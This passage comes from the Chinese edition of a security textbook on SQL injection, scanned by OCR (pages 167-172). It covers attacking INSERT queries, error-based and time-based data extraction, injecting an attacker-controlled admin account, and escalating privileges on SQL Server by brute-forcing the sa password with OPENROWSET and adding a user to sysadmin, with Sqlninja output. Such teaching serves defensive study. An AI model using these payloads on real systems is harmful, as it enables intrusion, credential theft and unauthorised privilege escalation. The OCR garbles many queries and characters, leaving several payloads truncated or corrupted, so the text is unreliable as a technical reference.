---
## Page 167
第4章利用SQL注入
INSERT INTO table (col1, co12) VALUES (*foo*, *bar*+/**/ascii (substring
(usex () , 1, 1)) +**)
INSERT INTO table (col1, co12) VALUES (*foo′, *bar*+/**/ascii (substring
(user () , 2,1)) +**)
INSERT INTO table (co11, co12) VALUES (*foo′, *bar*+/**/ascii (substring
(user () , 3, 1) ) +**)
4.7.2第二种情形：生成INSERT错误
在第二种情形下，我们想使用一个INSERT查询从数据库中提取信息，但是为了避免污染
数据库中的表，或者避免增加不必要的日志条目，我们想在该INSERT查询未成功执行的情况
下，实现信息的提取。一个相对简单的情形，是当INSERT返回一个错误消息时，在该错误消
息中带有我们正要提取的信息，假定在Web网站中要求你输人姓名和年龄，并且姓名是一个
容易注入的字段。该查询将如下所示：
INSERT INTO users (name, age) VALUES ('foo′,10)
可以利用这一查询，在name列中实施注入以触发一个错误，比如注入下面的语句：
foo*, (select top 1 name from users where age=8eversion)) -*
注入该语句后会发生什么情况呢？我们注入了一个子查询，试图从user表中检索一行数
据，但是由于@@version不是数值，因此该子查询将会执行失败，它返回下列消息：
Conversion failed when converting the nvarchar value *Microsoft SQL
Server 2008 (RTM) - 10.0.1600.22 (Intel X86)
bE:Eb:bT 800z 6 1n0
Copyright (c) 1988-2008 Microsoft Corporation
Standard Edition on Windows Nr 5.2  (Build 3790: Service Pack 2)
* to data type int.
非常好！我们已经提取到了详细的版本信息，但是INSERT查询并没有被执行。当然事情
并不总是这样简单，应用程序可能不会为我们提供如此详细的错误消息，在某些情况下，为了
获得想要提取的信息，实际上需要使注入的内部查询能够成功执行面不是失败，但是为了避免
对数据产生修改，与此同时需要让外部查御（即INSERT查询)执行失败。例如，内部查询可能
用于基于时间的甘注，这意味看根据某位的值，该子查询将产生或不产生时间上的延迟。无论
是否产生延迟，子查询都需要成功执行，而非执行失败（但是外部的INSERT查询必须失败)。
在MySQL上，MathyVanhoef最近研究了类似的情形。总体的策略是基于标量子查询，标
量子查询就是只返问单列值面不是多列值或多行的子查询。例如，请考虑下面的查询：
如果内部查询只返回一个值（或NULL)，外部查询将执行成功。但是，如果内部查询返回
了超过一个以上的结果，MySQL将中止外部查询并向用户提供如下所示的错误消息：
ERROR 1242 (21000): Subquery returns more than 1 row
请注意，即使在外部查询被中止时，内部查询也已经成功执行了。因此，如果可以注入两
个嵌套的SELECT查询，以便内部查询用于提取消息，而外部查询确保执行失败，就可以成功
153
---
## Page 168
SQL注入攻击与防御（第2版
提取数据，并且不允许原始的INSERT查询执行。
最简单的例子是使用一个内部查询，它对某种条件进行求值，然后根据结果暂停数秒：度
量请求与响应之间的时间可以推断出这一结果。例如，请考虑下面的查询：
value2* AS foobar)) ALIAS)
CASE子句检查提取的MySQL版本信息，如果遇到特定的版本，SLEEP命令将执行以延
迟5秒的时间。这可以告诉我们MySQL是否是某个特定的版本，同时UNION命令将确保向
外部SELECT返回两行数据，从而产生错误。接下来，假定我们可以注入下面的查询中：
INSERT INTO table 1 VALUES (*injectable_parameter′)
可以向该查询的参数注入下面的语句：
′I1 SELECT (SELECT CASE WHEN @@version LIKE '5.1.56s' THEN SLEEP (5)
注入后的查询将如下所示：
INSERT INTO table 1 VALUES (**II SELECT (SELECT CASE WHEN @eversion
在上面的注入中，使用了连接操作符（ID，以便在INSERT语句的预期的参数字符串中注入
嵌套的SELECT查询。该查询将提取数据库的版本，但不会实际修改任何数据。
显然，当提取的数据量较大时，基于时间的攻击将变得非常缓慢。但是，如果来自内部查
询结果的不同错误消息取决于我们检查的条件，那么提取速度就可以变得非常快。可以使用
REGEXP操作符来完成该任务，在下面的示例查询中可以看到REGEXP操作符的应用：
(oobar)
如果条件（condition）为true，CASE子句将使用有效的正则表达式*，它将向最外层的
SELECT语句返回两行数据，我们将接收到常见的错误：
ERROR 1242 (21000) : Subquery returns more than 1 row
然而，如果条件为false，REGEXP将采用*作为参数，它并不是一个有效的正则表达式，
在这种情况下数据库服务器将返回下列错误：
from regexp
如果对于这些错误，前端Web应用程序返回了不同的结果，那么我们可以放弃较慢的基
于时间的方法，开始以较快的速度转储表中的数据。
154
---
## Page 169
第4章利用SQL注入
Mathy最初的研究包含所有细节并提供了更多的例子，可以查阅以下网址来获得这些信息：
www.mathyvanhoef.com/2011/10/exploiting-insert-into-sqlinjections.html。
4.7.3其他情形
还存在其他情形：攻击者在注入攻击中使用了INSERT语句，但它并不是可以实施注入攻
击的唯一可用的查询类型，此时采用INSERT语句并不是必需的。例如，当攻击者可以使用堆
叠查询，并且设法提取了包含应用程序用户的表，在这种情况下使用一个INSERT查询将非常
有用。如果发现了包含电子邮件地址、密码哈希和o值代表管理员（administrator）的权限级别，
攻击者很可能想注入类似于下面语句的查询，以获得对应用程序当前权限的访问：
http: / /www, victim, com/searchpeople.asp?name=* ; INSERT+INTO+users
(id, pas8,privs) +VALUES+ (*attacker@evi1 , com*, *hashpass*, 0) -*
从上面的讨论可以看到，与注入更为常用的SELECT查询相比，攻击INSERT查询也并非
十分困难。根据具体的情况，需要额外小心，以道免诸如向数据库填充垃圾数据等副作用。另
外，攻击者在练习时需要具有一些创造性，以便克服前面我们所讨论的哪些障碍。
4.8提升权限
所有的现代数据库服务器均为其管理员提供了控制手段，可以对用户可执行的操作进行精
细化控制。可以通过为每个用户赋予指定的权限（例如，只能访问特定数据库和执行特定操作
的能力）来管理并控制其对存储的信息的访问。我们攻击的后台数据库服务器可能包含多个数
据库，但执行查询的用户可能只能访问其中的某一个，该数据库中可能并未包含我们最想要的
信息。还有可能用户只能读取数据，面我们测试的目的是检查是否能够以未授权方式修改数据。
换言之，我们不得不面对这样的现实：执行查询的用户只是一个普通用户，其权限远低于
DBA:
由于对普通用户存在着限制，要想充分发挥前面介绍的几种攻击的潜力，就必须获取管理
员访问权。幸运的是，在某些情况下我们可以获取提升后的权限。
4.8.1SQL Server
对于Microsof SQL Server数据库，OPENROWSET命令是攻击者最好的助手之一。
OPENROWSET作用于SQLServer上，实现对远程OLEDB数据源（例如另一个SQLServer数
据库）的一次性连接。DBA可用它来检索远程数据库上的数据，以此作为永久连接（link）两个数
据库的一种手段。它尤其适用于需定期交换数据的场合。调用OPENROWSET的典型方法如下
所不：
SELECT * FROM OPENROWSET ('SQLOLEDB', 'NetWOrk=DBMSSOCN; Address*
10,0.2.2;uid=foo; pwd=password*, *SELECT column1 FROM tableA')
上述语句中以用户foo连接到地址为 10.0.2.2的 SQLServer并执行 selecr columIfrom
NableA查询，最外层的查询传递并返回该查询的结果。请注意，foo是地址为10.0.2.2的数据库
的一个用户，面不是首次执行OPENROWSET时的数据库用户。另外还要注意，要想作为foo
155
---
## Page 170
SQL注入攻击与防御（第2版）
用户成功执行该查询，我们还必须提供正确的口令以便验证能通过。
OPENROWSET在SQL注入攻击中有很多应用。本例中我们使用它来暴力破解sa账户的
口令。这里需要记住三个要点：
·要想连接成功，OPENROWSET必须提供执行连接的数据库上的有效凭证。
·OPENROWSET不仅可用于连接远程数据库，还可用于执行本地连接：执行本地连接
时，使用用户在OPENROWSET调用中指定的权限。
●在SQLServer 2000上，所有用户均可调用OPENROWSET：而在SQLServer 2005和
2008上，款认情况下该操作被禁用。但有时会被DBA重薪启用，因此值得一试。
这意味着如果OPENROWSET可用，就可以使用OPENROWSET来暴力破解sa口令并提
升权限。例如，请看下列查询：
SELECT * FROM OPENROWSET(′SQLOLEDB′, 'Network=DBMSSOCN;Address=/uid=sa;
pwd=foo′, 'select 1′)
如果foo是正确的口令，那么将执行该查询并返回1；但如果口令不正确，那么将收到下
面这条消息：
Login failed for user 'sa',
现在我们有了一种暴力破解sa口令的方法！请列出您喜欢的词汇表，祝您好运。如果找
到了正确的口令，便可以使用sp_addsrvrolemember存储过程米将用户（可使用system_user来找
到添加至sysadmin组，这样使可以很容易地提升权限。sp_addsrvrolemember存储过程接收两
个参数：一个是用户，另一个是将用户添加到的组（很明显，本例中为sysadmin)。
SELECT * FROM OPENROWSET(*SQLOLEDB′, *NetWOrk=DBMSSOCN;
Address=;uid=sa;pwd=passw0rd', *SELECT 1; EXEC
master, dbo,sp_addsrvrolemenber *'appdbuser**, *'sysadmin***)
OPENROWSET期望至少返回一列，因而内部查询中的SELECT1是必需的。可以使用前
面介绍的技术检索system_uscr的值（例如，将它的值强制转换为数字变量以触发一个错误）。如
果应用程序并未直接返回足够的信息，那么可以使用第5章介绍的SQL盲注技术。此外，可
以注入下列查询，该查询在一个请求中执行完整个过程。它首先构造一个包含OPENROWSET
查询和正确用户名的字符串@q，然后通过将@q传递给xp_execresultset扩展存储过程（在SQL
Server2000上，所有用户均可调用它）来执行该查询。
DECLARE 8q nvarchar (999) :
Address=;uid=sa;pwd=passwOrd'', **SELECT 1; EXEC
 ,( 
EXEC master.dbo.xp_execresultset @q, N*master'
警告：
请记住，只有当目标SQLServer上启用了混合验证模式时，sa账户才能工作，使用混合
验证模式时，Windows用户和SQLServer用户（比如sa)均可通过数据库验证。如果远程数据库
服务器上配置的只有Windows验证模式，那么此时只有Windows用户能够访问数据库，sa账
156
---
## Page 171
第4章利用SQL注入
户将不可用，可以通过技术手段尝试暴力破解拥有管理员访问权限的Windows用户（如果知道
用户名的话）。不过，如果当前使用了账户锁定机制，那么操作时可能会封锁该账户，一定要
小心
可以注入下列代码来检测当前使用的是哪种验证模式（它决定了是否可尝试攻击）：
select serverproperty(′IsIntegratedSecurityOnly′)
如果当前采用的只有Windows验证模式，那么该查询返回1，否则返回0.
当然，手动进行暴力破解攻击是不现实的。虽然构建一个自动执行该任务的脚本并不是很
难，但我们可以使用一些能实现整个过程的免费工具，比如 Bobcat、Burp Intruder和Sqlninja(均
由本书作者编写）。我们以 Sqlninja(可以从http:/sqlninja.sourceforge.net上下载)为例说明该攻
击。首先检查我们是否拥有管理员权限（下列输出内容已精简为最重要的部分）：
icesurfer@psylocibe  $ ./sqlninja -m fingerprint
Sqlninja re1. 0.2.6
Copyright (C)2011 icesurfer 
[+]  Parsing sqlninja,conf...
[+]  Target is: www.victim.com:80
What do you want to discover ?
0 - Database version (2000/2005/2008)
1 - Database user
2 - Database user rights
3 - Whether xp_cmdshe1l is working
5 - Khether SQL Server runs as System
4=
Whether mixed or Windows-only authentication is used
(xp_cmdshell must be available)
6 - Current database nane
qe 9 1o 1 - e
h - Print this menu
q - exit
[+] Checking whether user is member of sysadmin server role... You are
Z
[+]  Parsing configuration file..........*
[+]  Target is: www.victim.com:80
[+] Wordlist has been specified: using dictionary-based bruteforce
[+]  Bruteforcing the sa password. This might take a while
dba password is...: s3cr3t
bruteforce took 834 seconds
[+] Trying to add current user to sysadmin group
157
---
## Page 172
SQL注入攻击与防御（第2版）
成功了！看起来Sqlninja找到了正确的口令并使用它将当前用户添加到了sysadmin组。可
使用跟踪模式重新运行Sqlninja以进行核查：
icesurfer@psylocibe ~ $ ./sqlninja -m fingerprint
Sqlninja rel. 0.2.6
Copyright (C) 2006-2011 icesurfer 
[+]   Parsing sqlninja.conf...
[+]  Target is: www,victim.com:80
What do you want to discover ?
0 - Database version (2000/2005/2008)
1-
Database user
2 - Database user rights
-
Whether xp_cndshell is working